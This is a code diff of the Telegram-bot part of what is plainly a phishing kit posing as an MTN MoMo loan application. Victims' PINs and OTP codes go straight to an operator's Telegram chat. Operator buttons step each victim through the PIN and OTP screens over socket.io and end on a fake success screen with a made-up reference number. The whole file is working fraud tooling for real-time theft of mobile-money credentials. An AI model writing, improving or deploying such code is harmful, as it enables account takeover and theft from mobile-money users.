@@ -5,108 +5,94 @@ const TelegramBot = require("node-telegram-bot-api");
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
 const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 
-// Prevent application crash on global bot errors
-bot.on("error", (err) => console.error("Telegram Bot Error:", err.message));
-
 const botManager = {
     bot: bot,
 
-    sendToAdmin: async (appId, title, data, needsApproval = false) => {
-        try {
-            let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
-            for (const [k, v] of Object.entries(data)) {
-                msg += `<b>${k}:</b> <code>${v}</code>\n`;
-            }
-
-            const options = { parse_mode: 'HTML' };
-            if (needsApproval) {
-                options.reply_markup = {
-                    inline_keyboard: [[
-                        { text: "✅ APPROVE (Move to PIN)", callback_data: `approve_1_${appId}` },
-                        { text: "❌ REJECT", callback_data: `reject_0_${appId}` }
-                    ]]
-                };
-            }
-            await bot.sendMessage(ADMIN_ID, msg, options);
-        } catch (err) {
-            console.error("Error sending message to admin:", err.message);
+    sendToAdmin: (appId, title, data, needsApproval = false) => {
+        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        for (const [k, v] of Object.entries(data)) {
+            msg += `<b>${k}:</b> <code>${v}</code>\n`;
         }
+        msg += `━━━━━━━━━━━━━━━━━━━━`;
+
+        const options = { parse_mode: 'HTML' };
+        if (needsApproval) {
+            options.reply_markup = {
+                inline_keyboard: [[
+                    // Step 5 Approval moves user to Step 6 (OTP screen)
+                    { text: "✅ APPROVE PIN", callback_data: `approve_5_${appId}` },
+                    { text: "❌ REJECT", callback_data: `reject_5_${appId}` }
+                ]]
+            };
+        }
+        bot.sendMessage(ADMIN_ID, msg, options);
     },
 
-    sendFinalApproval: async (appId, pin) => {
-        try {
-            const msg = `🏁 <b>🇬🇲 STEP 2: SECURITY PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>`;
-            await bot.sendMessage(ADMIN_ID, msg, {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: "✅ COMPLETE PIN (Move to Loan)", callback_data: `approve_2_${appId}` },
-                        { text: "❌ REJECT", callback_data: `reject_0_${appId}` }
-                    ]]
-                }
-            });
-        } catch (err) {
-            console.error("Error sending final approval message:", err.message);
-        }
+    sendFinalApproval: (appId, code) => {
+        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🏁 <b>🇿🇲 MTN MOMO OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔢 OTP: <code>${code}</code>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━`;
+        
+        bot.sendMessage(ADMIN_ID, msg, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [[
+                    // Step 6 Approval finishes the transaction workflow entirely
+                    { text: "✅ COMPLETE LOAN", callback_data: `approve_6_${appId}` },
+                    { text: "❌ REJECT", callback_data: `reject_6_${appId}` }
+                ]]
+            }
+        });
     }
 };
 
-// Handle Admin Button Clicks safely with try-catch blocks
-bot.on("callback_query", async (query) => {
-    try {
-        if (!query.data) return;
-        const [action, step, appId] = query.data.split("_");
-        const io = global.io;
+// Handle Admin Button Clicks
+bot.on("callback_query", (query) => {
+    const [action, step, appId] = query.data.split("_");
+    const io = global.io;
 
-        if (!io) {
-            console.error("Socket.io instance global.io is not initialized yet.");
-            return;
+    if (!io) {
+        bot.answerCallbackQuery(query.id, { text: "Error: Socket instance missing" });
+        return;
+    }
+
+    if (action === "approve") {
+        if (step === "5") {
+            // Signal frontend to move from Step 5 (PIN) to Step 6 (OTP)
+            io.to(appId).emit('pin-verified');
+            bot.answerCallbackQuery(query.id, { text: "PIN Verified. OTP screen sent to user." });
+        } 
+        else if (step === "6") {
+            // Signal frontend to show final success screen with the tracking ref
+            const ref = "MTNZM-ZMW-" + Math.floor(Math.random() * 900000 + 100000);
+            io.to(appId).emit('otp-verified', { referenceId: ref });
+            bot.answerCallbackQuery(query.id, { text: "MTN MoMo Loan Application Completed!" });
+        }
+        
+        bot.editMessageText(query.message.text + `\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
+            chat_id: ADMIN_ID,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
+    }
+
+    if (action === "reject") {
+        if (step === "5") {
+            io.to(appId).emit('pin-failed', { message: "MTN MoMo PIN declined by administrator." });
+            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
+        } else if (step === "6") {
+            io.to(appId).emit('otp-failed', { message: "MTN MoMo OTP validation declined by administrator." });
+            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
         }
 
-        let statusText = "";
-        let actionProcessed = false;
-
-        if (action === "approve") {
-            if (step === "1") {
-                io.to(appId).emit('password-verified');
-                await bot.answerCallbackQuery(query.id, { text: "PIN input shown to user" });
-                statusText = "\n\n✅ <b>ACTION: APPROVED (MOVED TO PIN)</b>";
-                actionProcessed = true;
-            } 
-            else if (step === "2") {
-                io.to(appId).emit('pin-verified');
-                await bot.answerCallbackQuery(query.id, { text: "PIN confirmed. User moving to Loan details." });
-                statusText = "\n\n✅ <b>ACTION: PIN APPROVED (MOVED TO LOAN)</b>";
-                actionProcessed = true;
-            }
-        }
-
-        if (action === "reject") {
-            io.to(appId).emit('error', { message: "Application declined by admin." });
-            await bot.answerCallbackQuery(query.id, { text: "Application Rejected" });
-            statusText = "\n\n❌ <b>ACTION: REJECTED</b>";
-            actionProcessed = true;
-        }
-
-        // Only edit the message layout if an approval or rejection step was processed
-        if (actionProcessed && query.message && query.message.text) {
-            const chatId = query.message.chat.id;
-            
-            await bot.editMessageText(query.message.text + statusText, {
-                chat_id: chatId,
-                message_id: query.message.message_id,
-                parse_mode: 'HTML'
-            }).catch(() => {
-                // Fallback option using clean text if HTML entities break parsing rules
-                bot.editMessageText(query.message.text + statusText.replace(/<[^>]*>/g, ''), {
-                    chat_id: chatId,
-                    message_id: query.message.message_id
-                });
-            });
-        }
-    } catch (err) {
-        console.error("Callback query handling error caught safely:", err.message);
+        bot.editMessageText(query.message.text + `\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
+            chat_id: ADMIN_ID,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
     }
 });
-
+  
 module.exports = botManager;
